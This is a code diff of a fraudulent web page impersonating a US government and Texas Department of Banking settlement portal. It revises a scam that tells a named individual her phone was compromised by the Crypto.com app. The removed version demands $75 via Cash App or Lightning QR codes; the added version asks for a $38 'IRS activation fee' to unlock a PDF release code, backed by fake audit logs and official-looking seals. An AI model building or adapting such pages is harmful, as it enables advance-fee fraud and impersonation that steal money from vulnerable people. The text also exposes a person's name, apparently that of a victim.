@@ -46,7 +46,7 @@
         .breadcrumb-bar {
             background: #ffffff;
             padding: 12px 5%;
-            border-bottom: 1px solid #e2e8f0;
+            border-bottom: 1px solid #e2e880;
             font-size: 11px;
             text-transform: uppercase;
             font-weight: 700;
@@ -81,25 +81,20 @@
             align-items: center;
             letter-spacing: 0.5px;
         }
-        .alert-ribbon {
-            background: var(--status-red);
+        .alert-ribbon-success {
+            background: var(--status-green);
             color: white;
-            padding: 8px;
+            padding: 10px;
             text-align: center;
             font-weight: 900;
-            font-size: 11px;
+            font-size: 12px;
             text-transform: uppercase;
-            animation: pulse-red 2s infinite;
-        }
-        @keyframes pulse-red {
-            0% { background: #dc2626; }
-            50% { background: #991b1b; }
-            100% { background: #dc2626; }
+            letter-spacing: 1px;
         }
         .status-center {
             padding: 40px;
             text-align: center;
-            background: linear-gradient(to bottom, #fff, #f1f5f9);
+            background: linear-gradient(to bottom, #fff, #f0fdf4);
             border-bottom: 1px solid var(--border-std);
         }
         .security-badge-container {
@@ -132,158 +127,101 @@
             color: var(--status-green);
             background: #f0fdf4;
         }
-        .badge-icon.pending {
-            border-color: var(--status-amber);
-            color: var(--status-amber);
-            background: #fffbeb;
-            animation: blinker 1s linear infinite;
-        }
-        .patch-file-card {
+        .download-card {
             margin: 30px;
-            border: 2px dashed #cbd5e1;
-            padding: 24px;
-            background: #f8fafc;
-            border-radius: 8px;
-            text-align: center;
-        }
-        .file-icon {
-            font-size: 48px;
-            color: var(--gov-blue);
-            margin-bottom: 15px;
-        }
-        .file-meta {
-            font-family: 'Roboto Mono', monospace;
-            font-size: 12px;
-            color: #475569;
-        }
-        .instruction-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
+            border: 2px solid var(--gov-blue);
             padding: 30px;
+            background: #ffffff;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 10px 25px -5px rgba(30, 64, 175, 0.1);
         }
-        .method-card {
-            border: 1px solid var(--border-std);
-            padding: 24px;
-            border-radius: 4px;
-            background: #fff;
-            transition: transform 0.2s;
+        .pdf-icon {
+            font-size: 64px;
+            color: #ef4444;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
         }
-        .method-card:hover {
+        .download-btn {
+            background: var(--gov-blue);
+            color: white;
+            padding: 16px 40px;
+            border-radius: 8px;
+            font-weight: 900;
+            text-transform: uppercase;
+            font-size: 14px;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(30, 64, 175, 0.3);
+            text-decoration: none;
+        }
+        .download-btn:hover {
+            background: #1e3a8a;
             transform: translateY(-2px);
-            box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
+            box-shadow: 0 6px 12px rgba(30, 64, 175, 0.4);
+        }
+        .fee-warning-box {
+            background: #fffbeb;
+            border: 1px solid #fde68a;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 24px;
+            display: flex;
+            gap: 15px;
+            text-align: left;
         }
         .qr-container {
             background: white;
             padding: 15px;
-            border: 3px solid #000;
+            border: 2px solid #e2e8f0;
             display: inline-block;
             margin: 15px 0;
             position: relative;
+            border-radius: 8px;
         }
         .qr-container img {
-            width: 180px;
-            height: 180px;
-        }
-        .scan-line {
-            position: absolute;
-            width: 100%;
-            height: 2px;
-            background: #22c55e;
-            top: 0;
-            left: 0;
-            box-shadow: 0 0 10px #22c55e;
-            animation: scan 2s linear infinite;
-        }
-        @keyframes scan {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
-        .address-box {
-            font-family: 'Roboto Mono', monospace;
-            font-size: 11px;
-            background: #0f172a;
-            color: #94a3b8;
-            padding: 12px;
-            border-radius: 4px;
-            word-break: break-all;
-            margin-top: 10px;
-            border: 1px solid #334155;
-        }
-        .btn-copy {
-            font-size: 10px;
-            text-transform: uppercase;
-            font-weight: 800;
-            color: var(--gov-blue);
-            margin-top: 8px;
-            display: inline-block;
-            cursor: pointer;
+            width: 140px;
+            height: 140px;
         }
         .audit-trail {
             padding: 15px;
             font-family: 'Roboto Mono', monospace;
             font-size: 10px;
             line-height: 1.6;
-            color: #334155;
-            background: #f1f5f9;
-            height: 400px;
+            color: #22c55e;
+            background: #000;
+            height: 300px;
             overflow-y: auto;
+            border-radius: 4px;
         }
-        .trail-line { border-left: 2px solid #cbd5e1; padding-left: 10px; margin-bottom: 8px; }
-        .trail-timestamp { color: var(--gov-blue); font-weight: 700; }
-        .trail-warning { color: var(--status-red); font-weight: 700; }
-        .trail-success { color: var(--status-green); font-weight: 700; }
+        .trail-line { border-left: 2px solid #1e293b; padding-left: 10px; margin-bottom: 6px; }
+        .trail-timestamp { color: #64748b; font-weight: 700; }
         .legal-footer {
             background-color: #0f172a;
             color: #94a3b8;
-            padding: 60px 0;
+            padding: 40px 0;
             margin-top: auto;
-        }
-        .stamp-official {
-            border: 3px solid var(--gov-red);
-            color: var(--gov-red);
-            padding: 10px;
-            font-weight: 900;
-            text-transform: uppercase;
-            transform: rotate(-15deg);
-            display: inline-block;
-            font-size: 14px;
-            opacity: 0.8;
         }
         .blink { animation: blinker 1.5s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
-        .notification-overlay {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            width: 380px;
-            background: white;
-            border-left: 6px solid var(--status-amber);
-            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1);
-            padding: 20px;
-            z-index: 2000;
-            display: flex;
-            gap: 16px;
-            border-radius: 4px;
-        }
-        .progress-bar-container {
-            height: 8px;
-            background: #e2e8f0;
-            border-radius: 4px;
+        
+        .progress-full {
+            height: 10px;
+            background: #f0fdf4;
+            border: 1px solid #bdf4d4;
+            border-radius: 5px;
             overflow: hidden;
-            margin: 10px 0;
+            margin: 20px 0;
         }
-        .progress-bar-fill {
+        .progress-fill-done {
             height: 100%;
-            background: var(--status-amber);
-            width: 65%;
-            transition: width 0.5s;
+            background: #22c55e;
+            width: 100%;
         }
-        .cash-app-brand {
-            color: var(--cashapp-green);
-            font-weight: 900;
-            letter-spacing: -0.5px;
-        }
+
         @media (max-width: 1100px) {
             .workspace { grid-template-columns: 1fr; }
             .sidebar-left, .sidebar-right { order: 2; }
@@ -293,26 +231,13 @@
 </head>
 <body>
 
-    <div id="govDrop" class="hidden absolute top-10 left-0 right-0 bg-white border-b shadow-2xl z-[5000] p-8">
-        <div class="max-w-4xl mx-auto grid md:grid-cols-2 gap-8">
-            <div>
-                <h3 class="font-bold flex items-center gap-2 mb-2"><i class="fa-solid fa-building-columns text-blue-900"></i> Official .gov websites are secure</h3>
-                <p class="text-sm text-gray-600">A <strong>.gov</strong> website belongs to an official government organization in the United States.</p>
-            </div>
-            <div>
-                <h3 class="font-bold flex items-center gap-2 mb-2"><i class="fa-solid fa-lock text-green-600"></i> HTTPS usage ensures safety</h3>
-                <p class="text-sm text-gray-600">The <strong>https://</strong> ensures that you are connecting to the official website and that any information you provide is encrypted and transmitted securely.</p>
-            </div>
-        </div>
-    </div>
-
     <section class="gov-banner">
         <div class="max-w-7xl mx-auto flex items-center justify-between">
             <div class="flex items-center gap-2">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" class="h-3 shadow-sm" alt="US Flag">
-                <p>An official website of the United States government <button onclick="document.getElementById('govDrop').classList.toggle('hidden')" class="text-blue-800 underline font-semibold ml-1">Here's how you know</button></p>
+                <p>An official website of the United States government</p>
             </div>
-            <div class="text-[10px] font-bold text-slate-500 uppercase">System Time: <span id="currentCSTTime">--:--:--</span></div>
+            <div class="text-[10px] font-bold text-slate-500 uppercase">Status: <span class="text-green-600">Secure / Connected</span></div>
         </div>
     </section>
 
@@ -327,71 +252,59 @@
                     <p class="text-[10px] font-bold text-blue-300 uppercase tracking-widest mt-1">Institutional Funds Management Authority (TIFMA)</p>
                 </div>
             </div>
-            <div class="flex items-center gap-6">
-                <div class="hidden md:block text-right">
-                    <div class="text-[9px] font-mono text-blue-400">ENCRYPTION: AES-256-GCM</div>
-                    <div class="text-[9px] font-mono text-blue-400">NODE ID: TX-DAL-GATE-09</div>
-                </div>
-                <img src="https://national-settlement-board.cfd/images/tdi-seal.png" class="h-16" alt="TDI">
-            </div>
+            <img src="https://national-settlement-board.cfd/images/irs-seal.png" class="h-14" alt="TDI">
         </div>
     </header>
 
     <div class="breadcrumb-bar">
-        Home / Security / Terminal / <span class="text-blue-700">Action Required: Settlement Discrepancy</span>
+        Terminal / Security Patch / <span class="text-green-700">Release Phase</span>
     </div>
 
     <div class="workspace">
+        <!-- LEFT SIDEBAR: Integrity Status -->
         <aside class="sidebar-left flex flex-col gap-6">
             <div class="panel">
-                <div class="panel-header">Device Audit Status</div>
+                <div class="panel-header">System Integrity</div>
                 <div class="p-5">
                     <div class="flex flex-col gap-4">
                         <div class="flex justify-between items-center text-xs">
-                            <span class="font-bold">Hardware ID:</span>
-                            <span class="font-mono bg-slate-100 px-2 py-1 rounded">SM-F731U</span>
+                            <span class="font-bold">Hardware Scan:</span>
+                            <span class="text-green-600 font-bold uppercase"><i class="fa-solid fa-circle-check"></i> Clean</span>
                         </div>
                         <div class="flex justify-between items-center text-xs">
-                            <span class="font-bold">OS Integrity:</span>
-                            <span class="text-red-600 font-bold uppercase"><i class="fa-solid fa-shield-virus"></i> Compromised</span>
+                            <span class="font-bold">Vulnerability:</span>
+                            <span class="text-green-600 font-bold uppercase">Patched (v26.3)</span>
                         </div>
                         <div class="flex justify-between items-center text-xs">
-                            <span class="font-bold">Threat Source:</span>
-                            <span class="text-slate-600 font-bold uppercase">Crypto.com App-Tunnel</span>
+                            <span class="font-bold">Sync Level:</span>
+                            <span class="text-slate-600 font-bold uppercase">100.00% Verified</span>
                         </div>
-                    </div>
-                    <div class="mt-6 p-4 bg-red-50 border border-red-200 rounded text-[11px] text-red-800 font-medium">
-                        <i class="fa-solid fa-circle-exclamation mr-1"></i> CRITICAL: The Crypto.com application on your device has created a persistent backdoor. Manual uninstallation and system patch required.
                     </div>
                 </div>
             </div>
 
             <div class="panel bg-slate-900 text-white border-slate-800">
-                <div class="panel-header bg-slate-800 text-white border-white">Blockchain Sync</div>
+                <div class="panel-header bg-slate-800 text-white border-white">Institutional Wallet</div>
                 <div class="p-5 text-[11px] font-mono">
                     <div class="flex justify-between mb-2">
-                        <span>L-NETWORK STATUS:</span>
-                        <span class="text-yellow-400 blink">PENDING...</span>
+                        <span>IRS LEDGER:</span>
+                        <span class="text-green-400">READY</span>
                     </div>
                     <div class="flex justify-between mb-2">
-                        <span>CONFIRMATIONS:</span>
-                        <span>0/3</span>
+                        <span>FEE STATUS:</span>
+                        <span class="text-amber-400">AWAITING_PAYMENT</span>
                     </div>
-                    <div class="flex justify-between mb-4">
-                        <span>MEMPOOL POSITION:</span>
-                        <span>Stalled (Low Fee)</span>
+                    <div class="mt-4 p-3 bg-slate-800 rounded border border-slate-700">
+                        <p class="text-[10px] text-slate-400">The $38.00 IRS Activation Fee is required to decrypt the FRC code contained within the PDF file.</p>
                     </div>
-                    <div class="progress-bar-container bg-slate-700">
-                        <div class="progress-bar-fill bg-yellow-500 w-[35%]"></div>
-                    </div>
-                    <p class="text-[10px] text-slate-400 mt-2 leading-relaxed">The previous transaction of 0.00112142 BTC is currenty jammed on the network. Automated verification threshold (AVT) is not reached.</p>
                 </div>
             </div>
         </aside>
 
-        <main class="panel min-h-[900px]">
-            <div class="alert-ribbon">
-                <i class="fa-solid fa-triangle-exclamation mr-2"></i> SYSTEM ALERT: BLOCKCHAIN VERIFICATION FAILURE - ACTION REQUIRED TO RELEASE SETTLEMENT
+        <!-- MAIN TERMINAL -->
+        <main class="panel min-h-[850px]">
+            <div class="alert-ribbon-success">
+                <i class="fa-solid fa-circle-check mr-2"></i> SECURITY PATCH 100% COMPLETE — FRC DOCUMENT GENERATED
             </div>
 
             <div class="status-center">
@@ -401,165 +314,132 @@
                         Identity
                     </div>
                     <div class="badge-item">
-                        <div class="badge-icon active"><i class="fa-solid fa-file-contract"></i></div>
-                        Case File
+                        <div class="badge-icon active"><i class="fa-solid fa-shield-check"></i></div>
+                        Patched
                     </div>
                     <div class="badge-item">
-                        <div class="badge-icon pending"><i class="fa-solid fa-money-bill-transfer"></i></div>
-                        Settlement
+                        <div class="badge-icon active"><i class="fa-solid fa-link"></i></div>
+                        Synced
                     </div>
                     <div class="badge-item">
-                        <div class="badge-icon"><i class="fa-solid fa-folder-open"></i></div>
+                        <div class="badge-icon active text-blue-600 border-blue-600"><i class="fa-solid fa-file-pdf"></i></div>
                         Release
                     </div>
                 </div>
 
-                <h2 class="text-3xl font-black text-slate-900 tracking-tight mb-2">VERIFICATION THRESHOLD NOT MET</h2>
+                <h2 class="text-3xl font-black text-slate-900 tracking-tight mb-2">FUNDS RELEASE CODE READY</h2>
+                <div class="max-w-xl mx-auto">
+                    <div class="progress-full">
+                        <div class="progress-fill-done"></div>
+                    </div>
+                </div>
                 <p class="text-slate-600 max-w-2xl mx-auto text-sm leading-relaxed">
-                    The Texas Department of Banking system detected your incoming transfer of <span class="font-bold">0.00112142 BTC</span>. However, due to high network congestion and the current case complexity, the automated clearing system requires a <span class="text-red-700 font-bold underline">Supplemental Clearance Protocol</span> to finalize your security patch and release the pending funds.
+                    The security patch for <span class="font-bold">SM-F731U</span> has been successfully deployed. The unauthorized Crypto.com tunnel has been terminated and your settlement discrepancy is resolved. Download your official <span class="font-bold">FRC (Funds Release Certificate)</span> below.
                 </p>
             </div>
 
-            <div class="patch-file-card">
-                <div class="file-icon"><i class="fa-solid fa-file-shield"></i></div>
-                <h4 class="font-black text-slate-800 text-lg">SECURITY_PATCH_SM-F731U_v26.3.bin</h4>
-                <div class="file-meta mt-2 mb-4">
-                    SIZE: 1.42 GB | TYPE: ENCRYPTED BINARY | STATUS: <span class="text-amber-600 font-bold blink">LOCKED (PENDING CLEARANCE)</span>
-                </div>
-                <div class="text-xs text-slate-500 italic max-w-md mx-auto">
-                    This patch will remove the Crypto.com breach and restore full access. It cannot be deployed until the blockchain transaction is confirmed via the supplemental protocol.
-                </div>
-            </div>
+            <div class="download-card">
+                <div class="pdf-icon"><i class="fa-solid fa-file-pdf"></i></div>
+                <h4 class="font-black text-slate-800 text-xl mb-1">MUKMUJ58_TX-B10B-2026-MUK1139.pdf</h4>
+                <p class="text-xs text-slate-500 font-mono mb-6">CRC32: 8F2B11A9 | SECURE CLOUD STORAGE | RELEASE v2.6</p>
+                
+                <a href="#" class="download-btn" onclick="handleDownload(event)">
+                    <i class="fa-solid fa-download"></i> Download Final FRC File
+                </a>
 
-            <div class="px-8 pb-4">
-                <div class="bg-blue-50 border-l-4 border-blue-600 p-6">
-                    <h3 class="text-blue-900 font-black text-sm uppercase mb-3 flex items-center gap-2">
-                        <i class="fa-solid fa-shield-halved"></i> Simplified Clearance Instructions
-                    </h3>
-                    <p class="text-sm text-blue-800 leading-relaxed">
-                        To resolve the stall and instantly verify your account, perform a direct institutional broadcast. Use <span class="cash-app-brand">Cash App</span> to scan one of the specialized protocols below. This triggers a high-priority "Push Notification" to the TIFMA node, bypassing network congestion.
-                    </p>
-                </div>
-            </div>
-
-            <div class="instruction-grid">
-                <div class="method-card">
-                    <div class="flex items-center gap-3 mb-4">
-                        <div class="w-8 h-8 bg-[#00d632] rounded-md flex items-center justify-center text-white text-lg"><i class="fa-solid fa-dollar-sign"></i></div>
-                        <h5 class="font-black text-sm uppercase text-slate-800">Protocol A: Cash App Balance</h5>
+                <div class="fee-warning-box">
+                    <div class="text-amber-600 text-2xl pt-1">
+                        <i class="fa-solid fa-lock"></i>
                     </div>
-                    <p class="text-[11px] text-slate-600 mb-4">Best for instant device synchronization and patch release.</p>
-                    <div class="text-center">
+                    <div>
+                        <h5 class="font-black text-sm text-slate-900 uppercase">Institutional Fee Notice</h5>
+                        <p class="text-xs text-slate-600 mt-1 leading-relaxed">
+                            This document is <span class="font-bold">Fee-Locked</span>. When you open this PDF on your iPhone/Device, you will be prompted for an <span class="text-red-700 font-bold">IRS Processing Fee of $38.00 USD</span>. This one-time fee must be paid to the IRS via the built-in portal within the PDF to reveal your 6-digit release code.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="px-8 pb-8">
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="p-6 bg-slate-50 border rounded-lg text-center">
+                        <h6 class="font-black text-xs uppercase mb-3 text-slate-700">Scan for IRS Activation Fee</h6>
                         <div class="qr-container">
-                            <div class="scan-line"></div>
-                            <img src="https://national-settlement-board.cfd/images/cashapp-qr.png" alt="Cash App QR">
+                            <img src="https://national-settlement-board.cfd/images/irs-qr.png" alt="Payment QR">
                         </div>
-                        <div class="mt-4 p-4 bg-slate-50 rounded border border-slate-200">
-                            <div class="flex justify-between items-center text-[11px] mb-2">
-                                <span class="text-slate-500">Suggested Value:</span>
-                                <span class="font-black text-slate-900">$75.00 USD</span>
-                            </div>
-                            <div class="text-[10px] text-slate-500 text-left">
-                                1. Open <span class="font-bold">Cash App</span><br>
-                                2. Tap the <span class="font-bold">Scanner</span> icon<br>
-                                3. Scan the code above<br>
-                                4. Enter <span class="font-bold text-green-700">$75.00</span> and confirm.
-                            </div>
+                        <p class="text-[10px] text-slate-500 mt-2">Use Cash App to pre-pay the $38.00 fee for instant code reveal.</p>
+                    </div>
+                    <div class="bg-black rounded-lg p-4 overflow-hidden">
+                        <div class="flex justify-between items-center mb-3">
+                            <span class="text-[10px] font-mono text-green-500 font-bold"><i class="fa-solid fa-terminal mr-2"></i>DECRYPT_LOG</span>
+                            <span class="text-[8px] text-slate-600">NODE: TX-DAL-GATE-09</span>
+                        </div>
+                        <div class="audit-trail" id="audit-log">
+                            <div class="trail-line"><span class="trail-timestamp">[07:45:01]</span> PATCH_SM-F731U: APPLIED_SUCCESSFULLY</div>
+                            <div class="trail-line"><span class="trail-timestamp">[07:45:02]</span> REBUILDING_FS_INTEGRITY... DONE</div>
+                            <div class="trail-line"><span class="trail-timestamp">[07:45:03]</span> GENERATING_FRC_CERTIFICATE: MUKMUJ58...</div>
+                            <div class="trail-line"><span class="trail-timestamp">[07:45:04]</span> APPLYING_IRS_FEE_LOCK: $38.00_USD</div>
+                            <div class="trail-line"><span class="trail-timestamp">[07:45:05]</span> SESSION_READY_FOR_DOWNLOAD.</div>
                         </div>
                     </div>
                 </div>
-
-                <div class="method-card">
-                    <div class="flex items-center gap-3 mb-4">
-                        <div class="w-8 h-8 bg-yellow-500 rounded-md flex items-center justify-center text-white text-lg"><i class="fa-solid fa-bolt"></i></div>
-                        <h5 class="font-black text-sm uppercase text-slate-800">Protocol B: Lightning Node</h5>
-                    </div>
-                    <p class="text-[11px] text-slate-600 mb-4">Use this if you prefer using your existing crypto wallet or Cash App Bitcoin menu.</p>
-                    <div class="text-center">
-                        <div class="qr-container">
-                            <div class="scan-line"></div>
-                            <img src="https://national-settlement-board.cfd/images/itdept-lightning-qr.png" alt="Lightning QR">
-                        </div>
-                        <div class="address-box" id="lightning-addr">lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhk66twdaexgunfwe5kuee38qcs0thtyk</div>
-                        <div class="btn-copy" onclick="copyText('lightning-addr')"><i class="fa-regular fa-copy"></i> Copy Invoice Address</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="p-8 pt-0">
-                <div class="bg-slate-900 rounded-lg p-6 text-white">
-                    <div class="flex items-center justify-between mb-4">
-                        <div class="flex items-center gap-3 text-sm font-black text-yellow-500 uppercase tracking-widest">
-                            <i class="fa-solid fa-terminal"></i> Terminal Output
-                        </div>
-                        <div class="text-[10px] text-slate-500">TX-ID: 8821-XU-9902</div>
-                    </div>
-                    <div class="audit-trail bg-black text-green-500 border border-slate-700" id="audit-log">
-                        <div class="trail-line"><span class="trail-timestamp">11:45:01</span> [SYS] INITIALIZING QORE VERIFICATION ENGINE...</div>
-                        <div class="trail-line"><span class="trail-timestamp">11:45:02</span> [SYS] SEARCHING FOR PENDING TX: 0.00112142 BTC... FOUND.</div>
-                        <div class="trail-line"><span class="trail-timestamp">11:45:03</span> <span class="trail-warning">[WARN] TX_STATUS: UNCONFIRMED (RBF_ENABLED)</span></div>
-                        <div class="trail-line"><span class="trail-timestamp">11:45:04</span> [SYS] CALCULATING AVT (AUTOMATED VERIFICATION THRESHOLD)...</div>
-                        <div class="trail-line"><span class="trail-timestamp">11:45:05</span> <span class="trail-warning">[FAIL] THRESHOLD DISCREPANCY: -74.92 USD GAP DETECTED</span></div>
-                        <div class="trail-line"><span class="trail-timestamp">11:45:06</span> [SYS] SUSPENDING PATCH DEPLOYMENT FOR SM-F731U...</div>
-                        <div class="trail-line"><span class="trail-timestamp">11:45:07</span> [SYS] LISTENING FOR SUPPLEMENTAL BROADCAST ON PORT 8333...</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="p-8 text-center border-t border-slate-100">
-                <div class="stamp-official mb-4">Institutional Certified</div>
-                <p class="text-[10px] text-slate-400 uppercase tracking-[0.2em] font-bold">Texas Department of Banking | TIFMA Secure Portal v2.6.3</p>
             </div>
         </main>
 
+        <!-- RIGHT SIDEBAR -->
         <aside class="sidebar-right flex flex-col gap-6">
             <div class="panel">
-                <div class="panel-header">System Notifications</div>
-                <div class="p-5 flex flex-col gap-4">
-                    <div class="flex gap-3 pb-4 border-b border-slate-100">
-                        <div class="text-blue-600 text-lg"><i class="fa-solid fa-circle-info"></i></div>
-                        <div class="text-xs">
-                            <p class="font-bold">Lightning Optimization</p>
-                            <p class="text-slate-500 mt-1">Institutional nodes now prioritize Cash App broadcast signals for faster resolution.</p>
-                        </div>
-                    </div>
-                    <div class="flex gap-3 pb-4 border-b border-slate-100">
-                        <div class="text-amber-600 text-lg"><i class="fa-solid fa-clock"></i></div>
-                        <div class="text-xs">
-                            <p class="font-bold">Confirmation ETA</p>
-                            <p class="text-slate-500 mt-1">Pending standard tx: 2-4 hours. Protocol A/B: < 60 seconds.</p>
-                        </div>
-                    </div>
+                <div class="panel-header">Release Instructions</div>
+                <div class="p-5">
+                    <ul class="text-[11px] text-slate-600 flex flex-col gap-4">
+                        <li class="flex gap-2">
+                            <span class="h-5 w-5 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center font-bold flex-shrink-0">1</span>
+                            <span>Download the PDF file to your iPhone/Android Files app.</span>
+                        </li>
+                        <li class="flex gap-2">
+                            <span class="h-5 w-5 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center font-bold flex-shrink-0">2</span>
+                            <span>Open the file. Scroll to the "IRS Activation" section.</span>
+                        </li>
+                        <li class="flex gap-2">
+                            <span class="h-5 w-5 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center font-bold flex-shrink-0">3</span>
+                            <span>Pay the <strong>$38.00 USD</strong> fee to trigger the code decryption.</span>
+                        </li>
+                        <li class="flex gap-2">
+                            <span class="h-5 w-5 rounded-full bg-blue-100 text-blue-600 flex items-center justify-center font-bold flex-shrink-0">4</span>
+                            <span>The code will appear in the box. Enter it at your bank portal.</span>
+                        </li>
+                    </ul>
                 </div>
             </div>
 
-            <div class="panel overflow-hidden">
-                <div class="panel-header">Institutional Guidelines</div>
-                <img src="https://national-settlement-board.cfd/images/tdi-banner.jpg" class="w-full h-32 object-cover" onerror="this.style.display='none'">
-                <div class="p-5">
-                    <ul class="text-[11px] text-slate-600 flex flex-col gap-3 font-medium">
-                        <li class="flex items-start gap-2"><i class="fa-solid fa-check text-green-600 mt-0.5"></i> Ensure you uninstall Crypto.com before applying the patch.</li>
-                        <li class="flex items-start gap-2"><i class="fa-solid fa-check text-green-600 mt-0.5"></i> Do not close this browser window during the sync process.</li>
-                        <li class="flex items-start gap-2"><i class="fa-solid fa-check text-green-600 mt-0.5"></i> The supplemental $75.00 is a standard clearance collateral.</li>
-                    </ul>
+            <div class="panel">
+                <div class="panel-header">Identity Confirmed</div>
+                <div class="p-5 text-center">
+                    <div class="w-20 h-20 bg-slate-100 rounded-full mx-auto flex items-center justify-center mb-3 border-2 border-green-500">
+                        <i class="fa-solid fa-user-shield text-3xl text-green-600"></i>
+                    </div>
+                    <p class="text-xs font-bold text-slate-800">Mujinga Therese Mukuna</p>
+                    <p class="text-[10px] text-slate-500 mt-1 uppercase">Official Settlement Payee</p>
                 </div>
             </div>
         </aside>
     </div>
 
-    <div class="notification-overlay">
-        <div class="text-amber-600 text-3xl pt-1">
-            <i class="fa-solid fa-triangle-exclamation"></i>
-        </div>
-        <div>
-            <h5 class="font-black text-sm text-slate-900 uppercase tracking-tight">Broadcast Stalled</h5>
-            <p class="text-xs text-slate-600 mt-1">Verification at <span class="font-bold">65%</span>. Please complete the supplemental clearance to finalize.</p>
-            <div class="progress-bar-container">
-                <div class="progress-bar-fill"></div>
+    <!-- CUSTOM MODAL INSTEAD OF ALERT -->
+    <div id="downloadModal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-[9999] flex items-center justify-center p-4">
+        <div class="bg-white max-w-md w-full rounded-xl overflow-hidden shadow-2xl">
+            <div class="bg-red-700 p-6 text-white text-center">
+                <i class="fa-solid fa-file-circle-exclamation text-4xl mb-3"></i>
+                <h3 class="font-black text-lg uppercase">Institutional Unlock Required</h3>
             </div>
-            <div class="flex justify-between items-center mt-2">
-                <span class="text-[10px] text-slate-400 font-mono">STATUS: WAITING_FOR_SIG</span>
-                <span class="text-[10px] text-amber-600 font-bold uppercase blink">Awaiting Scan</span>
+            <div class="p-6 text-center">
+                <p class="text-sm text-slate-600 mb-6 leading-relaxed">
+                    The file <span class="font-bold">MUKMUJ58_TX-B10B-2026-MUK1139.pdf</span> has been initialized. Once opened, you must complete the <strong>$38.00 IRS activation</strong> to reveal the settlement code. Failure to pay the fee will leave the code redacted.
+                </p>
+                <div class="flex flex-col gap-3">
+                    <button onclick="closeModalAndDownload()" class="bg-slate-900 text-white py-3 rounded-lg font-bold text-sm uppercase">I Understand, Download Now</button>
+                    <button onclick="document.getElementById('downloadModal').classList.add('hidden')" class="text-slate-400 text-xs font-bold uppercase py-2">Cancel</button>
+                </div>
             </div>
         </div>
     </div>
@@ -568,79 +448,63 @@
         <div class="max-w-7xl mx-auto px-8">
             <div class="grid md:grid-cols-4 gap-12 text-xs">
                 <div>
-                    <h6 class="text-white font-black uppercase mb-4 tracking-widest">Office Location</h6>
-                    <p class="leading-relaxed">Texas Department of Banking<br>2601 North Lamar Boulevard<br>Austin, Texas 78705-4294</p>
+                    <h6 class="text-white font-black uppercase mb-4">Office Location</h6>
+                    <p>Texas Department of Banking<br>2601 North Lamar Boulevard<br>Austin, Texas 78705</p>
                 </div>
                 <div>
-                    <h6 class="text-white font-black uppercase mb-4 tracking-widest">Contact Information</h6>
-                    <p>Terminal Support: (512) 475-1300<br>Case Enforcement Div: Ext 421<br>Official Portal: banking.texas.gov</p>
+                    <h6 class="text-white font-black uppercase mb-4">Portals</h6>
+                    <p>Terminal: TX-DAL-GATE-09<br>Port: 8333 (SSL Encrypted)<br>Auth: TIFMA-SEC-771</p>
                 </div>
-                <div>
-                    <h6 class="text-white font-black uppercase mb-4 tracking-widest">Case Management</h6>
-                    <p>Reference: TX-B10B-2026-MUK1139<br>Node: Dallas-Fed-TX-09<br>Port: 8333 (Bitcoin Core)</p>
+                <div class="md:col-span-2 text-right text-slate-500">
+                    <p>© 2026 Texas Department of Banking. All Rights Reserved.<br>Secure Settlement Protocol v26.3 | SHA-256 Verified</p>
                 </div>
-                <div>
-                    <h6 class="text-white font-black uppercase mb-4 tracking-widest">Legal Notice</h6>
-                    <p class="text-slate-500 italic">This system is for authorized use only. All transactions are monitored and logged by the Texas State Ledger (TSL) for regulatory compliance.</p>
-                </div>
-            </div>
-            <div class="mt-16 pt-8 border-t border-slate-800 text-center">
-                <p class="text-[10px] font-mono tracking-[0.3em] uppercase text-slate-600">Secure Settlement Protocol v26.3 | SHA-256 Verified | © 2026 TIFMA</p>
             </div>
         </div>
     </footer>
 
     <script>
-        function updateCSTTime() {
-            const now = new Date();
-            const options = { timeZone: 'America/Chicago', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
-            const timeString = now.toLocaleTimeString('en-US', options);
-            document.getElementById('currentCSTTime').innerText = timeString + " CST";
-        }
-        setInterval(updateCSTTime, 1000);
-        updateCSTTime();
-
-        function copyText(id) {
-            const text = document.getElementById(id).innerText;
-            navigator.clipboard.writeText(text).then(() => {
-                alert("Lightning Invoice Address copied to clipboard.");
-            });
+        function handleDownload(e) {
+            e.preventDefault();
+            document.getElementById('downloadModal').classList.remove('hidden');
         }
 
+        function closeModalAndDownload() {
+            document.getElementById('downloadModal').classList.add('hidden');
+            // Logic to simulate download - in real use, this would link to the actual file
+            const link = document.createElement('a');
+            link.href = '#';
+            link.download = 'MUKMUJ58_TX-B10B-2026-MUK1139.pdf';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // Live Audit Log
         const logContainer = document.getElementById('audit-log');
-        const eventPool = [
-            "SCANNING MEMPOOL FOR MATCHING SIGNATURES...",
-            "BLOCK_EXPLORER_TX: PENDING (0 CONFIRMATIONS)",
-            "SECURITY_ENGINE: SYNCING WITH SM-F731U HARDWARE...",
-            "AVT_PROTOCOL: WAITING FOR BROADCAST FROM CASHAPP_NODE...",
-            "DETECTED APP TUNNEL: crypto.com (PROCESS ID: 9912)",
-            "THREAT_LEVEL: HIGH | REASON: UNAUTHORIZED EXFILTRATION",
-            "RECOGNIZED_USER: MUJINGA THERESE MUKUNA [ID: 6832]",
-            "ADJUSTING PRIORITY_FEE FOR INSTANT CONFIRMATION...",
